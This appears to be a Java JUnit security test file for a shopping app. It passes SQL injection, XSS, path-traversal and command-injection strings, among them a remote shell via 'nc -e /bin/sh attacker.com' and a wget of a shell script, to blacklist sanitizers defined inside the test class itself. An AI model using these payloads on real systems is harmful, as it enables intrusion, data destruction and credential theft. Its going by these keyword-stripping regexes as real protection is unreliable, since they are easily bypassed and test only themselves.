package com.iloveshopping.security;

import com.iloveshopping.entity.User;
import com.iloveshopping.repository.UserRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Security tests for input validation and injection prevention.
 */
class SecurityValidationTest {

    @Nested
    @DisplayName("SQL Injection Prevention Tests")
    class SqlInjectionTests {

        @ParameterizedTest
        @DisplayName("Should sanitize potential SQL injection in search queries")
        @ValueSource(strings = {
                "'; DROP TABLE products; --",
                "1'; DELETE FROM users WHERE '1'='1",
                "' OR '1'='1",
                "'; UPDATE users SET role='admin' WHERE '1'='1",
                "UNION SELECT * FROM users --",
                "1; TRUNCATE TABLE products;",
                "admin'--",
                "' OR 1=1 --",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        })
        void shouldNotAllowSqlInjection(String maliciousInput) {
            // Given
            String sanitized = sanitizeInput(maliciousInput);
            
            // Then - verify potentially dangerous characters are escaped or removed
            assertThat(sanitized).doesNotContain("DROP TABLE");
            assertThat(sanitized).doesNotContain("DELETE FROM");
            assertThat(sanitized).doesNotContain("UPDATE users");
            assertThat(sanitized).doesNotContain("INSERT INTO");
            assertThat(sanitized).doesNotContain("TRUNCATE");
        }

        private String sanitizeInput(String input) {
            if (input == null) return null;
            // Remove SQL keywords and dangerous characters
            return input.replaceAll("(?i)(DROP|DELETE|INSERT|UPDATE|TRUNCATE|ALTER|CREATE)", "")
                       .replaceAll("[;'\"\\-]", "");
        }
    }

    @Nested
    @DisplayName("XSS Prevention Tests")
    class XssTests {

        @ParameterizedTest
        @DisplayName("Should sanitize potential XSS in user inputs")
        @ValueSource(strings = {
                "<script>alert('xss')</script>",
                "<img src='x' onerror='alert(1)'>",
                "<body onload='alert(1)'>",
                "javascript:alert('xss')",
                "<svg onload='alert(1)'>",
                "<iframe src='javascript:alert(1)'>",
                "<div style='background:url(javascript:alert(1))'>",
                "<<SCRIPT>alert('XSS');//<</SCRIPT>",
                "<IMG SRC=JaVaScRiPt:alert('XSS')>",
                "<a href=\"javascript:alert('XSS')\">Click</a>"
        })
        void shouldNotAllowXss(String maliciousInput) {
            // Given
            String sanitized = sanitizeHtml(maliciousInput);
            
            // Then
            assertThat(sanitized).doesNotContain("<script>");
            assertThat(sanitized).doesNotContain("javascript:");
            assertThat(sanitized).doesNotContain("onerror=");
            assertThat(sanitized).doesNotContain("onload=");
        }

        private String sanitizeHtml(String input) {
            if (input == null) return null;
            // Remove HTML tags and JavaScript
            return input.replaceAll("<[^>]*>", "")
                       .replaceAll("(?i)javascript:", "")
                       .replaceAll("(?i)(onerror|onload|onclick|onmouseover)=", "");
        }
    }

    @Nested
    @DisplayName("Path Traversal Prevention Tests")
    class PathTraversalTests {

        @ParameterizedTest
        @DisplayName("Should prevent path traversal attacks")
        @ValueSource(strings = {
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/passwd",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc/passwd",
                "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "....\\\\....\\\\....\\\\windows\\system32"
        })
        void shouldNotAllowPathTraversal(String maliciousPath) {
            // Given
            String sanitized = sanitizePath(maliciousPath);
            
            // Then
            assertThat(sanitized).doesNotContain("..");
            assertThat(sanitized).doesNotContain("%2e");
            assertThat(sanitized).doesNotContain("%2f");
            assertThat(isSecurePath(sanitized)).isTrue();
        }

        private String sanitizePath(String input) {
            if (input == null) return null;
            return input.replaceAll("\\.\\.", "")
                       .replaceAll("%2e", "")
                       .replaceAll("%2f", "")
                       .replaceAll("\\\\", "/");
        }

        private boolean isSecurePath(String path) {
            return !path.contains("..") && 
                   !path.contains("/etc/") && 
                   !path.contains("/windows/") &&
                   !path.startsWith("/");
        }
    }

    @Nested
    @DisplayName("Command Injection Prevention Tests")
    class CommandInjectionTests {

        @ParameterizedTest
        @DisplayName("Should prevent command injection attacks")
        @ValueSource(strings = {
                "; rm -rf /",
                "| cat /etc/passwd",
                "& whoami",
                "`rm -rf /`",
                "$(rm -rf /)",
                "|| cat /etc/shadow",
                "; wget http://malicious.com/shell.sh",
                "| nc -e /bin/sh attacker.com 1234"
        })
        void shouldNotAllowCommandInjection(String maliciousInput) {
            // Given
            String sanitized = sanitizeCommand(maliciousInput);
            
            // Then
            assertThat(sanitized).doesNotContain(";");
            assertThat(sanitized).doesNotContain("|");
            assertThat(sanitized).doesNotContain("&");
            assertThat(sanitized).doesNotContain("`");
            assertThat(sanitized).doesNotContain("$(");
        }

        private String sanitizeCommand(String input) {
            if (input == null) return null;
            return input.replaceAll("[;|&`$()]", "");
        }
    }

    @Nested
    @DisplayName("Email Validation Tests")
    class EmailValidationTests {

        @ParameterizedTest
        @DisplayName("Should validate proper email format")
        @ValueSource(strings = {
                "test@example.com",
                "user.name@domain.org",
                "user+tag@example.co.uk",
                "name@subdomain.domain.com"
        })
        void shouldAcceptValidEmails(String email) {
            assertThat(isValidEmail(email)).isTrue();
        }

        @ParameterizedTest
        @DisplayName("Should reject invalid email formats")
        @ValueSource(strings = {
                "notanemail",
                "@nodomain.com",
                "missing@.com",
                "spaces in@email.com",
                "double@@at.com",
                ".startswithdot@email.com",
                "endswith.@email.com"
        })
        void shouldRejectInvalidEmails(String email) {
            assertThat(isValidEmail(email)).isFalse();
        }

        private boolean isValidEmail(String email) {
            if (email == null) return false;
            String regex = "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$";
            return email.matches(regex) && 
                   !email.startsWith(".") && 
                   !email.contains("..") &&
                   !email.contains("@@");
        }
    }

    @Nested
    @DisplayName("Password Strength Tests")
    class PasswordStrengthTests {

        @ParameterizedTest
        @DisplayName("Should accept strong passwords")
        @ValueSource(strings = {
                "SecureP@ss123",
                "MyStr0ng!Password",
                "C0mpl3x#Secure",
                "Test$Password1"
        })
        void shouldAcceptStrongPasswords(String password) {
            assertThat(isStrongPassword(password)).isTrue();
        }

        @ParameterizedTest
        @DisplayName("Should reject weak passwords")
        @ValueSource(strings = {
                "short",
                "nouppercase123!",
                "NOLOWERCASE123!",
                "NoNumbers!",
                "NoSpecial123",
                "password",
                "12345678",
                "qwerty123"
        })
        void shouldRejectWeakPasswords(String password) {
            assertThat(isStrongPassword(password)).isFalse();
        }

        private boolean isStrongPassword(String password) {
            if (password == null || password.length() < 8) return false;
            boolean hasUpper = password.chars().anyMatch(Character::isUpperCase);
            boolean hasLower = password.chars().anyMatch(Character::isLowerCase);
            boolean hasDigit = password.chars().anyMatch(Character::isDigit);
            boolean hasSpecial = password.matches(".*[!@#$%^&*()_+\\-=\\[\\]{};':\"\\\\|,.<>\\/?].*");
            return hasUpper && hasLower && hasDigit && hasSpecial;
        }
    }
}
